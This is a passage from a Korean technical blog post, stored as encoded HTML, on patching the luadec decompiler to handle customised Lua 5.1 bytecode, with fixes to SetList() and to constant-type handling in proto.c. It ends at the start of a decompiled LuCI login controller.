&#xB2F4;&#xB2F9;&#xD558;&#xB294; &#xC18C;&#xC2A4; &#xD30C;&#xC77C;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p><code>decompile.c</code></p><p>  luadec&#xC774; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xD560; &#xB54C;, &#xC8FC;&#xC694;&#xD558;&#xAC8C; &#xC791;&#xB3D9;&#xD558;&#xB294; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. lua &#xD30C;&#xC77C;&#xC758; &#xBC14;&#xC774;&#xD2B8; &#xCF54;&#xB4DC;&#xB97C; &#xD574;&#xC11D;&#xD558;&#xACE0; &#xBCC0;&#xC218;&#xC640; &#xC81C;&#xC5B4; &#xD750;&#xB984; &#xB4F1;&#xC758; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xC758; &#xD575;&#xC2EC; &#xB85C;&#xC9C1;&#xC774; &#xBAA8;&#xB450; &#xC774; &#xD30C;&#xC77C; &#xC548;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p><code>proto.c</code></p><p>  &#xC0C1;&#xC218; &#xAC12; &#xD574;&#xC11D;&#xC744; &#xB2F4;&#xB2F9;&#xD558;&#xB294; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. &#xBC14;&#xC774;&#xD2B8; &#xCF54;&#xB4DC;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC22B;&#xC790;, &#xBB38;&#xC790;&#xC5F4;, bool &#xB4F1;&#xC758; &#xC0C1;&#xC218; &#xAC12;&#xC744; &#xD14D;&#xC2A4;&#xD2B8;&#xB85C; &#xD574;&#xC11D;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, Opcode&#xC5D0; &#xC778;&#xC790;&#xB97C; &#xB098;&#xB220;&#xC8FC;&#xB294; &#xC5ED;&#xD560;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;.</p></li></ul><p>&#xC704;&#xC640; &#xAC19;&#xC740; &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xC5D0;&#xB7EC;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574;, &#xC81C;&#xAC00; &#xC2E4;&#xC2DC;&#xD55C; &#xBD84;&#xC11D;&#xACFC; luadec &#xD328;&#xCE58; &#xBC29;&#xC548;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h3 id="3-1-Lua-&#xD30C;&#xC77C;-&#xBD84;&#xC11D;"><a href="#3-1-Lua-&#xD30C;&#xC77C;-&#xBD84;&#xC11D;" class="headerlink" title="3.1. Lua &#xD30C;&#xC77C; &#xBD84;&#xC11D;"></a>3.1. Lua &#xD30C;&#xC77C; &#xBD84;&#xC11D;</h3><p><img src="image05.png" alt="image05.png"></p><p>Lua &#xD30C;&#xC77C; &#xAD6C;&#xC870;&#xB294; <a href="https://ieeexplore.ieee.org/document/10163061">&#xD574;&#xB2F9; &#xB17C;&#xBB38;</a>&#xC5D0;&#xC11C; &#xBC1C;&#xCDCC;&#xD55C; &#xC704; &#xC0AC;&#xC9C4;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD30C;&#xC77C; &#xD5E4;&#xB354;&#xC640; &#xD568;&#xC218; &#xD5E4;&#xB354;, &#xCF54;&#xB4DC;&#xC640; &#xC0C1;&#xC218; &#xD14C;&#xC774;&#xBE14;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xAD6C;&#xC870;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xD30C;&#xC77C;&#xC758; hex &#xC815;&#xBCF4;&#xB97C; &#xBE44;&#xAD50;&#xD558;&#xC5EC; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAC00;&#xC7A5; &#xBA3C;&#xC800; &#xBC84;&#xC804; &#xC815;&#xBCF4;&#xB97C; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574;, &#xD5E4;&#xB354; &#xC815;&#xBCF4;&#xB97C; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Lua &#xD30C;&#xC77C; &#xD5E4;&#xB354; &#xC815;&#xBCF4;&#xB294; &#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xCC98;&#xB7FC; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image06.png" alt="image06.png"></p><p>&#xC608;&#xC81C; Lua &#xD30C;&#xC77C;&#xC758; &#xD5E4;&#xB354; &#xC815;&#xBCF4;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74; Lua 5.1 &#xBC84;&#xC804;&#xC778; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image07.png" alt="image07.png"></p><p>&#xD30C;&#xC77C; &#xAD6C;&#xC870;&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xCF54;&#xB4DC; &#xC601;&#xC5ED;&#xACFC; &#xC0C1;&#xC218; &#xD14C;&#xC774;&#xBE14; &#xC601;&#xC5ED;&#xC744; &#xD1B5;&#xD574; Opcode&#xC640; &#xC0C1;&#xC218;&#xB97C; &#xC9C1;&#xC811; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">$ luac -l ./luafile.lua...2 [-]: CALL      R0 2 2       ; R0 := R0(R1)...$ xxd ./luaFile.lua...00000000: 1b4c 7561 5100 0104 0404 0804 0000 0000...</code></pre><p>&#xBA85;&#xB839;&#xC5B4;&#xB294; 4 Byte &#xD06C;&#xAE30;&#xC758; &#xB9AC;&#xD2C0;&#xC5D4;&#xB514;&#xC548; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; $pc &#xAC12; * 4&#xC758; &#xC624;&#xD504;&#xC14B; &#xC704;&#xCE58;&#xB85C; &#xB300;&#xC785;&#xD558;&#xBA74; &#xD574;&#xB2F9; hex &#xAC12;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xACE0;, &#xC774;&#xB97C; &#xB9E4;&#xD551;&#xD558;&#xC5EC; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD574;&#xC11D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; opcode&#xC640; instruction&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xBC29;&#xBC95;&#xC774;&#xB098; &#xD6C4;&#xC220;&#xD560; luadec &#xC5D0;&#xB7EC;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74;, &#xAE30;&#xC874; Lua &#xD30C;&#xC77C;&#xACFC; &#xB2E4;&#xB978; Custom&#xB41C; &#xC694;&#xC18C;&#xB098; &#xBD80;&#xBD84;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-2-&#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC778;-&#xD14C;&#xC774;&#xBE14;-&#xCD08;&#xAE30;&#xD654;"><a href="#3-2-&#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC778;-&#xD14C;&#xC774;&#xBE14;-&#xCD08;&#xAE30;&#xD654;" class="headerlink" title="3.2. &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC778; &#xD14C;&#xC774;&#xBE14; &#xCD08;&#xAE30;&#xD654;"></a>3.2. &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC778; &#xD14C;&#xC774;&#xBE14; &#xCD08;&#xAE30;&#xD654;</h3><p><code>SetList fails</code>&#xC758; &#xBA54;&#xC138;&#xC9C0;&#xB85C; &#xBC1C;&#xC0DD;&#xB418;&#xB294; &#xC774; &#xC5D0;&#xB7EC;&#xB294; <code>SetList</code>&#xC758; &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC778; &#xD14C;&#xC774;&#xBE14; &#xCD08;&#xAE30;&#xD654;&#xB85C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC5D0;&#xB7EC;&#xC785;&#xB2C8;&#xB2E4;.  &#xC774; &#xBB38;&#xC81C;&#xB294; <code>SETLIST</code> &#xBA85;&#xB839;&#xC5B4;&#xAC00; Lua &#xD45C;&#xC900;&#xACFC; &#xB2E4;&#xB978; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD14C;&#xC774;&#xBE14;&#xC758; 0&#xBC88; &#xC778;&#xB371;&#xC2A4;&#xBD80;&#xD130; &#xAC12;&#xC744; &#xCC44;&#xC6B0;&#xB824;&#xACE0; &#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xB0B4;&#xC6A9;&#xC740; luadec&#xC758; <code>decompile.c</code> &#xC6D0;&#xBCF8; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC; &#xC911; <code>SetList()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// decompile.c</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetList</span><span class="hljs-params">(Function* F, <span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">int</span> c)</span> </span>{<span class="hljs-keyword">int</span> i;DecTable* tbl = (DecTable*)FindFromListTail(&amp;(F-&gt;tables), (ListItemCmpFn)MatchTable, &amp;a);<span class="hljs-keyword">if</span> (tbl == <span class="hljs-literal">NULL</span>) {<span class="hljs-built_in">sprintf</span>(errortmp, <span class="hljs-string">&quot;No list found for R%d , SetList fails&quot;</span>, a);SET_ERROR(F, errortmp);<span class="hljs-keyword">return</span>;}<span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>) {<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* rstr;i = <span class="hljs-number">1</span>;<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {rstr = GetR(F, a + i);<span class="hljs-keyword">if</span> (error)<span class="hljs-keyword">return</span>;<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(rstr,<span class="hljs-string">&quot;.end&quot;</span>) == <span class="hljs-number">0</span>)<span class="hljs-keyword">break</span>;AddToTable(F, tbl, rstr, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// Lua5.1 specific <span class="hljs-doctag">TODO:</span> it&apos;s not really this :(</span>i++;};} <span class="hljs-comment">//should be {...} or func(func()) ,when b == 0, that will use all avaliable reg from R(a)</span></code></pre><p>&#xC774; &#xD568;&#xC218;&#xB294; <code>SETLIST</code> opcode&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xC9C0;&#xB9CC;, &#xD14C;&#xC774;&#xBE14;&#xC758; &#xC2DC;&#xC791; &#xC778;&#xB371;&#xC2A4;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xB294; <code>c</code> &#xC778;&#xC790;&#xB97C; &#xC644;&#xC804;&#xD788; &#xBB34;&#xC2DC;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Lua 5.1&#xC5D0;&#xC11C; &#xD14C;&#xC774;&#xBE14;&#xC758; &#xC2DC;&#xC791; &#xC778;&#xB371;&#xC2A4;&#xB294; <code>(c-1) * LFIELDS_PER_FLUSH</code> &#xACF5;&#xC2DD;&#xC73C;&#xB85C; &#xACC4;&#xC0B0;&#xB429;&#xB2C8;&#xB2E4;(<code>LFIELDS_PER_FLUSH</code>&#xB294; &#xBCF4;&#xD1B5; 50).</p><p>&#xC608;&#xC81C; &#xD30C;&#xC77C;&#xC758; &#xBC14;&#xC774;&#xD2B8; &#xCF54;&#xB4DC;&#xCC98;&#xB7FC; <code>c</code>&#xAC00; 1&#xC77C; &#xACBD;&#xC6B0; &#xC2DC;&#xC791; &#xC778;&#xB371;&#xC2A4;&#xB294; 0&#xC774; &#xB418;&#xB294;&#xB370;, &#xC704; &#xCF54;&#xB4DC;&#xB294; &#xC774; &#xACC4;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xB85C;&#xC9C1;&#xC774; &#xAE68;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; <code>SetList</code> &#xD568;&#xC218;&#xAC00; <code>c</code> &#xC778;&#xC790;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC2DC;&#xC791; &#xC778;&#xB371;&#xC2A4;&#xB97C; &#xC62C;&#xBC14;&#xB974;&#xAC8C; &#xACC4;&#xC0B0;&#xD558;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// decompile.c</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetList</span><span class="hljs-params">(Function* F, <span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">int</span> c)</span> </span>{<span class="hljs-keyword">int</span> i;DecTable* tbl = (DecTable*)FindFromListTail(&amp;(F-&gt;tables), (ListItemCmpFn)MatchTable, &amp;a);<span class="hljs-keyword">if</span> (tbl == <span class="hljs-literal">NULL</span>) {<span class="hljs-built_in">sprintf</span>(errortmp, <span class="hljs-string">&quot;No list found for R%d , SetList fails&quot;</span>, a);SET_ERROR(F, errortmp);<span class="hljs-keyword">return</span>;}<span class="hljs-keyword">int</span> start_index = (c - <span class="hljs-number">1</span>) * LFIELDS_PER_FLUSH;<span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>) {<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* rstr;i = <span class="hljs-number">1</span>;<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {rstr = GetR(F, a + i);<span class="hljs-keyword">if</span> (error)<span class="hljs-keyword">return</span>;<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(rstr,<span class="hljs-string">&quot;.end&quot;</span>) == <span class="hljs-number">0</span>)<span class="hljs-keyword">break</span>;AddToTable(F, tbl, rstr, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// Lua5.1 specific <span class="hljs-doctag">TODO:</span> it&apos;s not really this :(</span>i++;};} <span class="hljs-comment">//should be {...} or func(func()) ,when b == 0, that will use all avaliable reg from R(a)</span><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt;= b; i++) {<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* rstr = GetR(F, a + i);<span class="hljs-keyword">if</span> (error)<span class="hljs-keyword">return</span>;AddToTable(F, tbl, rstr, start_index + i); <span class="hljs-comment">// Lua5.1 specific <span class="hljs-doctag">TODO:</span> it&apos;s not really this :(</span>}}</code></pre><p>&#xC774;&#xB807;&#xAC8C; &#xD328;&#xCE58;&#xD558;&#xBA74; <code>SetList fails</code> &#xC5D0;&#xB7EC;&#xB97C; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h3 id="3-3-&#xC54C;-&#xC218;-&#xC5C6;&#xB294;-&#xC0C1;&#xC218;-&#xB370;&#xC774;&#xD130;-&#xD0C0;&#xC785;"><a href="#3-3-&#xC54C;-&#xC218;-&#xC5C6;&#xB294;-&#xC0C1;&#xC218;-&#xB370;&#xC774;&#xD130;-&#xD0C0;&#xC785;" class="headerlink" title="3.3. &#xC54C; &#xC218; &#xC5C6;&#xB294; &#xC0C1;&#xC218; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785;"></a>3.3. &#xC54C; &#xC218; &#xC5C6;&#xB294; &#xC0C1;&#xC218; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785;</h3><p>&#xB85C;&#xCEEC; &#xBCC0;&#xC218;&#xC5D0;&#xC11C; <code>Unknown_Type_Error</code> &#xBA54;&#xC138;&#xC9C0;&#xB85C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xC774; &#xC5D0;&#xB7EC;&#xB294; &#xC0C1;&#xC218;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xBB38;&#xC81C;&#xB294;  &#xBC14;&#xC774;&#xD2B8; &#xCF54;&#xB4DC;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xD2B9;&#xC815; &#xC0C1;&#xC218; &#xD0C0;&#xC785;&#xC774; &#xD45C;&#xC900; &#xC0C1;&#xC218; &#xD0C0;&#xC785;&#xC774; &#xC544;&#xB2C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC774;&#xB97C; &#xC778;&#xC2DD;&#xD558;&#xC9C0; &#xBABB;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB294; &#xC0C1;&#xC218; &#xAC12; &#xD574;&#xC11D;&#xC744; &#xB2F4;&#xB2F9;&#xD558;&#xB294; <code>proto.c</code>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// proto.c</span>...<span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">DecompileConstant</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Proto* f, <span class="hljs-keyword">int</span> i)</span> </span>{<span class="hljs-keyword">const</span> TValue* o = &amp;f-&gt;k[i];<span class="hljs-keyword">switch</span> (ttype(o)) {<span class="hljs-keyword">case</span> LUA_TBOOLEAN:<span class="hljs-keyword">return</span> strdup(bvalue(o)?<span class="hljs-string">&quot;true&quot;</span>:<span class="hljs-string">&quot;false&quot;</span>);<span class="hljs-keyword">case</span> LUA_TNIL:<span class="hljs-keyword">return</span> strdup(<span class="hljs-string">&quot;nil&quot;</span>);<span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> LUA_VERSION_NUM == 501 || LUA_VERSION_NUM == 502</span><span class="hljs-keyword">case</span> LUA_TNUMBER:{<span class="hljs-keyword">char</span>* ret = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">calloc</span>(<span class="hljs-number">128</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>));<span class="hljs-built_in">sprintf</span>(ret, LUA_NUMBER_FMT, nvalue(o));<span class="hljs-keyword">return</span> ret;}......<span class="hljs-keyword">default</span>:<span class="hljs-keyword">return</span> strdup(<span class="hljs-string">&quot;Unknown_Type_Error&quot;</span>);}}</code></pre><p><code>switch (ttype(o))</code>&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xC0C1;&#xC218; &#xD0C0;&#xC785;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xBD84;&#xAE30;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. <code>Unknown_Type_Error</code>&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC0C1;&#xC218; &#xD0C0;&#xC785; &#xAC12;&#xC744; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xCF54;&#xB4DC;&#xB97C; &#xC218;&#xC815;&#xD558;&#xACE0; &#xACB0;&#xACFC;&#xB97C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">default</span>:<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DEBUG: Found unknown constant type: %d\n&quot;</span>, ttype(o));<span class="hljs-keyword">return</span> strdup(<span class="hljs-string">&quot;Unknown_Type_Error&quot;</span>);}}</code></pre><pre><code class="hljs lua">DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span></code></pre><p>&#xC704; &#xACB0;&#xACFC; &#xAC12;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74;, &#xC608;&#xC81C; &#xD30C;&#xC77C;&#xC5D0;&#xC11C;&#xB294; 9&#xB77C;&#xB294; &#xD0C0;&#xC785;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Lua 5.1&#xC758; &#xD45C;&#xC900; &#xC0C1;&#xC218; &#xD0C0;&#xC785;&#xC740; 0-8&#xAE4C;&#xC9C0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><div class="table-container"><table><thead><tr><th>&#xC22B;&#xC790; &#xAC12;</th><th>&#xD0C0;&#xC785; &#xB9E4;&#xD06C;&#xB85C;</th><th>&#xC124;&#xBA85;</th></tr></thead><tbody><tr><td>0</td><td><code>LUA_TNIL</code></td><td><code>nil</code> &#xAC12;</td></tr><tr><td>1</td><td><code>LUA_TBOOLEAN</code></td><td><code>true</code> &#xB610;&#xB294; <code>false</code></td></tr><tr><td>2</td><td><code>LUA_TLIGHTUSERDATA</code></td><td>&#xACBD;&#xB7C9; &#xC720;&#xC800; &#xB370;&#xC774;&#xD130;</td></tr><tr><td>3</td><td><code>LUA_TNUMBER</code></td><td>&#xC22B;&#xC790; (&#xC815;&#xC218;/&#xC2E4;&#xC218; &#xAD6C;&#xBD84; &#xC5C6;&#xC74C;)</td></tr><tr><td>4</td><td><code>LUA_TSTRING</code></td><td>&#xBB38;&#xC790;&#xC5F4;</td></tr><tr><td>5</td><td><code>LUA_TTABLE</code></td><td>&#xD14C;&#xC774;&#xBE14;</td></tr><tr><td>6</td><td><code>LUA_TFUNCTION</code></td><td>&#xD568;&#xC218; (&#xD074;&#xB85C;&#xC800;)</td></tr><tr><td>7</td><td><code>LUA_TUSERDATA</code></td><td>&#xC804;&#xCCB4; &#xC720;&#xC800; &#xB370;&#xC774;&#xD130;</td></tr><tr><td>8</td><td><code>LUA_TTHREAD</code></td><td>&#xC2A4;&#xB808;&#xB4DC; (&#xCF54;&#xB8E8;&#xD2F4;)</td></tr></tbody></table></div><p>&#xC774;&#xB97C; &#xD1B5;&#xD574;, &#xC608;&#xC81C; &#xD30C;&#xC77C;&#xC5D0;&#xC11C;&#xB294; Custom &#xB41C; &#xC0C1;&#xC218; &#xD0C0;&#xC785;&#xC778; 9&#xB77C;&#xB294; &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xACE0;, &#xC774;&#xB97C; &#xC778;&#xC2DD;&#xD558;&#xC9C0; &#xBABB;&#xD574; &#xC5D0;&#xB7EC;&#xAC00; &#xBC1C;&#xC0DD;&#xD55C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC0C1;&#xC218; &#xD0C0;&#xC785;&#xC758; &#xAC12;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC83;&#xC744; &#xB514;&#xC2A4;&#xC5B4;&#xC148;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD558;&#xBA74;, &#xC815;&#xC218;&#xCC98;&#xB7FC; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">$ luadec -dis ./luaFile.lua19 [-]: SUB R6 R6 K10 ; R6 := R6 - Unknown_Type_Error</code></pre><p>&#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; Custom &#xC0C1;&#xC218; &#xD0C0;&#xC785;&#xC778; 9&#xB97C; &#xC815;&#xC218;&#xD615;&#xC73C;&#xB85C; &#xC81C;&#xC5B4;&#xD558;&#xB294; <code>case</code>&#xBB38;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xCF54;&#xB4DC;&#xB97C; &#xC218;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">DecompileConstant</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Proto* f, <span class="hljs-keyword">int</span> i)</span> </span>{<span class="hljs-keyword">const</span> TValue* o = &amp;f-&gt;k[i];<span class="hljs-keyword">switch</span> (ttype(o)) {<span class="hljs-keyword">case</span> LUA_TBOOLEAN:<span class="hljs-keyword">return</span> strdup(bvalue(o)?<span class="hljs-string">&quot;true&quot;</span>:<span class="hljs-string">&quot;false&quot;</span>);<span class="hljs-keyword">case</span> LUA_TNIL:<span class="hljs-keyword">return</span> strdup(<span class="hljs-string">&quot;nil&quot;</span>);<span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> LUA_VERSION_NUM == 501 || LUA_VERSION_NUM == 502</span><span class="hljs-keyword">case</span> LUA_TNUMBER:{<span class="hljs-keyword">char</span>* ret = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">calloc</span>(<span class="hljs-number">128</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>));<span class="hljs-built_in">sprintf</span>(ret, LUA_NUMBER_FMT, nvalue(o));<span class="hljs-keyword">return</span> ret;}<span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:  {      <span class="hljs-keyword">char</span>* ret = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">calloc</span>(<span class="hljs-number">128</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>));      <span class="hljs-built_in">sprintf</span>(ret, LUA_INTEGER_FMT, ivalue(o));       <span class="hljs-keyword">return</span> ret;  }<span class="hljs-keyword">case</span> LUA_TSTRING:</code></pre><p>&#xCF54;&#xB4DC;&#xB97C; &#xC815;&#xC218; &#xAC12;&#xC73C;&#xB85C; &#xCD9C;&#xB825;&#xD558;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xD558;&#xBA74;, &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xC5D0;&#xB7EC;&#xAC00; &#xD574;&#xACB0;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-comment">-- params : ...</span><span class="hljs-comment">-- function num : 0</span><span class="hljs-built_in">module</span>(<span class="hljs-string">&quot;luci.controller.login&quot;</span>, <span class="hljs-built_in">package</span>.<span class="hljs-built_in">seeall</span>)<span class="hljs-keyword">local</span> l_0_0 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.model.controller&quot;</span>)<span class="hljs-keyword">local</span> l_0_1 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;nixio&quot;</span>)<span class="hljs-keyword">local</span> l_0_2 = <span 